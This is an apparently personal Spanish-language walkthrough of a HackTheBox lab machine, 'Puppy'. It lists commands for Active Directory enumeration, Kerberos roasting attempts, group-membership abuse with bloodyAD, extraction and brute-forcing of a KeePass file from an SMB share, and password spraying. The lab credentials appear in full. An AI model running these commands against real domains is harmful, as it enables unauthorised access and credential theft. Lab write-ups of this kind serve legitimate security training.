levi.james / KingofAkron2025!
## Reconocimiento
`rustscan -a $IP --ulimit 1000 -r 1-65535 -- -A -sCV -oG allPorts`

*Puertos*
`53/DNS`
`88/kerberos`
`111/rpcbind`
`389/LDAP`
`445/SMB`
`5985/WinRm`


`netexec ldap $IP 2>/dev/null` 
`LDAP 10.10.11.70 389 DC [*] Windows Server 2022 Build 20348 (name:DC) (domain:PUPPY.HTB)`

`iRealm --force $IP PUPPY.HTB DC`
Nos añade la maquina a `/etc/hosts` y nos añade el nombre del dominio y FQDN a `/etc/krb5.conf`

Verificamos las credenciales son validas con [[CRACKMAPEXEC-NETEXEC]]
`nxc ldap $IP -u 'levi.james' -p 'KingofAkron2025!'` si sale en verde es que las credenciales son validas

Buscamos recursos compartidos con [[CRACKMAPEXEC-NETEXEC]]
`nxc smb $IP -u 'levi.james' -p 'KingofAkron2025!' --shares  -M spider_plus`

Nos genera un archivo `.JSON` en `/root/.nxc/modules/nxc_spider_plus/10.10.11.70.json`

#### Enumeración Usuarios

Enumerar usuarios del dominio con [[CRACKMAPEXEC-NETEXEC]] 
`nxc ldap $IP -u 'levi.james' -p 'KingofAkron2025!' --users`
```     
Administrator    
Guest            
krbtgt           
levi.james       
ant.edwards      
adam.silver      
jamie.williams   
steph.cooper     
steph.cooper_adm 
```

Enumeración de usuarios y verifica que exista en el dominio [[KERBRUTE]]
`kerbrute userenum --dc $IP -d puppy.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames`

 O también podemos usar [[CRACKMAPEXEC-NETEXEC]] para enumerar usuarios
 `nxc ldap $IP -u users.txt -p '' -k`
  El error `KDC_ERR_PREAUTH_FAILED` la contraseña no funciona pero existe el usuario
  El error `KDC_ERR_CLIENT_REVOKED` existe el usuario


### AS-REP ROASTING (Sin creds)
`impacket-GetNPUsers -no-pass -usersfile users.txt puppy.htb/`
No es susceptible al ataque. 

### KERBEROASTING (Con creds validas)
Enumeración de usuario que tenga serviceprincipalname (SPN) 
`impacket-GetUserSPNs 'puppy.htb/levi.james:KingofAkron2025!' -dc-ip $IP`
No es susceptible al ataque. 


Recopilar información del LDAP y se guarda en un `.zip` que este le usaremos para subir al blodhound
Subimos el archivo a bloodhound

Añadimos usuario a grupo DEVELOPERS por que tenemos generic write
`bloodyAD --host $IP -d puppy.htb -u 'levi.james' -p 'KingofAkron2025!' add groupMember 'DEVELOPERS' 'levi.james'`

Como nos hemos vovemos a acceder al smb y vemos que tenmos acceso a DEV
`nxc smb $IP -u 'levi.james' -p 'KingofAkron2025!' --shares `

Nos encontramos que en el directorio hay un archivo con extensión de keepass `kdbx` 
`recovery.kdbx`

Nos descargamos el archivo 
`nxc smb $IP -u 'levi.james' -p 'KingofAkron2025!' --share 'DEV' --get-file 'recovery.kdbx' 'recovery.kdbx'`

Lo añadimos a Keepassxc el archivo y nos pide una passwd
como no la tenemos la hacemos fuerza bruta

Usaremos `./keepas4brute.sh recovery.kdbx /usr/share/wordlists/rockyou.txt`
La contraseña que nos devuelve es `liverpool`

Dentro del archivo encontramos contraseñas, que las añadimos a un archivo y lo guardamos
Y haremos fuerza bruata a los primeros usuarios encontrados
`nxc ldap $IP -u users.txt -p pass.txt --continu-on-success | grep '[+]'`



